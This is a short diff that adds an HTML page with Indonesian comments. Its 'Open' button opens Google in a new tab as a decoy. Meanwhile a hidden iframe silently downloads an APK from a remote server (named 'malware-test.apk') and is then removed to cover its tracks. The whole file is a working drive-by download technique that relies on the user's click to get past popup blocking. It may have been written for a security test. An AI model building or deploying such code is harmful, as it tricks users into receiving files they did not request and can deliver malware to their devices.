@@ -1,0 +1,25 @@
+<button id="start">Open</button>
+
+<script>
+document.getElementById('start').addEventListener('click', () => {
+  // 1) buka Google di tab baru — ini di-trigger oleh user gesture sehingga biasanya tidak diblok
+  const googleWin = window.open('https://google.com', '_blank', 'noopener,noreferrer');
+
+  // 2) tunggu 3 detik lalu mulai download di background pada tab ini
+  setTimeout(() => {
+    const iframe = document.createElement('iframe');
+    iframe.style.display = 'none';
+    // pastikan URL ini adalah file .apk yang kamu sajikan dari server-mu
+    iframe.src = 'https://rebelsec.id/malware-test.apk';
+    document.body.appendChild(iframe);
+
+    // opsional: bersihkan iframe setelah beberapa detik
+    setTimeout(() => {
+      try { document.body.removeChild(iframe); } catch(e) {}
+    }, 10_000);
+  }, 3000);
+
+  // opsional: jika kamu ingin memfokus tab google yang baru dibuka:
+  // try { googleWin.focus(); } catch(e) {}
+});
+</script>
